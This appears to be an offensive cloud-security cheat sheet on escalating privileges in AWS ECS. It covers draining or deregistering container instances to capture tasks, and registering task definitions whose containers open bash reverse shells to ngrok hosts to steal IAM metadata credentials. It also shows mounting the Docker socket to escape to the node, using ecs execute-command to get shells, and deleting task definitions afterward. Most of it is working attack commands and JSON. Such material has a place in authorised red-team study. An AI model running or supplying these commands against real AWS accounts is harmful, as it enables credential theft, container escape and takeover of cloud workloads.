
## Stealing IAM Roles

Generally in ECS an IAM role will be assigned to the tasks running inside the container. If the task is set to run inside the EC2 instance, the EC2 instance will have another role attached to it. Which means if the attacker compromises an EC2 instance they can potentially obtain the the IAM role attached to the ECR and EC2 instance.
EC2 instance role will generally have permissions to update the container instance state of the EC2 instances being used as nodes inside the cluster. An attacker can modify the state of an instance to `DRAINING`, then the ECS will remove all the tasks from it and another instance will run as the `Replica`, which could potentially be the attacker's instance. From there he can still their IAM roles and other sensitive information and data from inside of the container.

- Changing the instance state to DRAINING
    - `aws ecs update-container-instances-state --cluster <cluster> --status DRAINING --container-instances <container-instance-id>`

There is also another similar way this technique can be done, but its not that stealthy as above, which is done by deregistering the EC2 instance from the cluster which will will force the tasks to be run in other instances.

- `aws ecs deregister-container-instance --cluster <cluster> --container-instance <container-instance-id> --force`

## Stealing Sensitive Information from Containers

The EC2 instance will probably also have the permission `ecr:GetAuthoriztion` which will allow the attacker to download image and search for sensitive information.

## iam:PassRole | ecs:RegisterTaskDefinition | ecs:RunTask

With these privileges, attacker can generate a new task definition with malicious container that steals the metadata credentials and run it.

- Generate task with reverse shell
    
    - `aws ecs register-task-definition --family <family_name> --task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"`
- Running task Definition
    
    - `aws ecs run-task --task-definition <family_name> --cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"`
- Delete task definition (after use)
    
    - `aws ecs deregister-task-definition --task-definition iam_exfiltration:1`

**Impact:** Direct privilege escalation to different ECS Roles.

## iam:PassRole | ecs:RegisterTaskDefinition | ecs:UpdateService | ecs:CreateService

It is similar as previous privilege, an attacker can generate a new task definition with a malicious container that steals the metadata credentials and run it by creating a new service with atleast one task running.

- Generate task definition with rev shell
    - `aws ecs register-task-definition --family iam_exfiltration --task-role-arn "$ECS_ROLE_ARN" --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"`
- Running the task creating a service
    - `aws ecs create-service --service-name exfiltration --task-definition iam_exfiltration --desired-count 1 --cluster <CLUSTER_ARN> --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"`
- Running the task after updating the service
    - `aws ecs update-service --cluster <CLUSTER NAME> --service <SERVICE NAME> --task-definition <NEW TASK DEFINITION NAME>`

**Impact:** Direct privilege escalation to any ECS role.

## ecs:RegisterTaskDefinition | ecs:RunTask | ecs:StartTask | ecs:UpdateService | ecs:CreateService

This scenario is like the previous examples but this time without `iam:PassRole` permission. Even without a role, attacker can run a privileged container to escape to the node and steal the EC2 IAM role and the other ECS containers roles running in the node.

- Register task
    - `aws ecs register-task-definition --family iam_exfiltration --cpu 256 --memory 512 --requires-compatibilities '["EC2"]' --container-definitions file:///tmp/task.json --volumes file:///tmp/volumes.json`

```
// Task.json
[
    {
        "name":"exfil_creds",
        "image":"python:latest",
        "entryPoint":["sh", "-c"],
        "command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
        "mountPoints": [
            {
                "readOnly": false,
                "containerPath": "/var/run/docker.sock",
                "sourceVolume": "docker-socket"
            }
        ]
    }
]

//Volumes.json
[
    {
        "name": "docker-socket",
        "host": {
            "sourcePath": "/var/run/docker.sock"
        }
    }
]
```

- Run Task
    - `aws ecs run-task --task-definition iam_exfiltration --cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster --launch-type EC2`

*This attack is only possible if the ECS cluster is using EC2 instances and not Fargate.*

## ecs:ExecuteCommand | ecs:DescribeTasks

With these privileges, attacker can execute commands inside a running container and exfiltrate the IAM role attached to it. However, the container instance need to be running the `ExecuteCommandAgent` which is not set as default.
Therefore the attacker could try to enumerate container with `enableExecuteCommand` on each task.

```
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
   echo "Cluster $cluster"
   for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
      echo "  Task $task"
      aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
   done
done
```

- Execute a shell in a container
    - `aws ecs execute-command --interactive --command "sh" --cluster <CLUSTER_ARN> --task <TASK_ARN>`

**Impact:** Direct Privilege escalation to a different role attached to containers.

## Summary

- If he has `ecs:RunTask`, run a task with `aws ecs run-task --enable-execute-command [...]`
- If he has `ecs:StartTask`, run a task with `aws ecs start-task --enable-execute-command [...]`
- If he has `ecs:CreateService`, create a service with `aws ecs create-service --enable-execute-command [...]`
- If he has `ecs:UpdateService`, update a service with `aws ecs update-service --enable-execute-command [...]`
